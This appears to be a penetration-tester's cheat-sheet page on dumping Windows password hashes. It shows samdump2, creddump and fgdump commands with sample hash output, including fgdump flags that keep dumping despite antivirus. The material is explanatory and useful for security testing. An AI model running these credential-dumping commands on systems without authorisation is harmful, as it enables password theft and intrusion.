---
tags: [hash,windows,password,dump]
---
# Extract windows hashes

## References

- https://linux.die.net/man/1/samdump2
- https://github.com/moyix/creddump
- https://www.aldeid.com/wiki/FGDump

## Example of execution

### samdump2

samdump2 (on linux)

```
$ samdump2 system SAM
Administrator:500:7bf4f254b212bb24bad3b435b51404ee:2892d26edf84d7a70e2eb3b9f05c425e:::
*disabled* Guest:501:aad3b435b51569eeaad3b435b51404ee:31d6cfe0d1eae931b73c59d7e0c089c0:::
*disabled* Test_account:1001:aad3b435b51569eeaad3b435b51404ee:80443829565540d434ee643af4c8adc0:::
```

### creddump

creddump (on linux)

```
$ pwdump /tmp/system /tmp/SAM 
Administrator:500:7bf4f254b212bb24bad3b435b51404ee:2892d26edf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51569eeaad3b435b51404ee:31d6cfe0d1eae931b73c59d7e0c089c0:::
Test_account:1001:aad3b435b51569eeaad3b435b51404ee:80443829565540d434ee643af4c8adc0:::
```

### fgdump

fgdump (on windows): very verbose (`-vv`), keeps the pwdump/cachedump going even if antivirus is in an unknown state (`-k`), will not attempt to detect or stop antivirus, even if it is present (`-a`), logs all output to logfile (`-l`), runs fgdump with the two parallel threads (`-T 2`).

```
fgdump.exe -vv -k -a -l -T 2
```

Will test for the presence of antivirus without actually running the password dump:

```
C:\Users\noraj\Downloads\fgdump.exe -t
fgDump 2.1.0 - fizzgig and the mighty group at foofus.net
Written to make j0m0kun's life just a bit easier
Copyright(C) 2008 fizzgig and foofus.net
fgdump comes with ABSOLUTELY NO WARRANTY!
This is free software, and you are welcome to redistribute it
under certain conditions; see the COPYING and README files for
more information.

--- Session ID: 2019-06-15-20-27-38 ---
Starting dump on 127.0.0.1

** Beginning local dump **
OS (127.0.0.1): Microsoft Windows Unknown Professional (Build 9600) (64-bit)

-----Summary-----

Failed servers:
NONE

Successful servers:
127.0.0.1

Total failed: 0
Total successful: 1
```
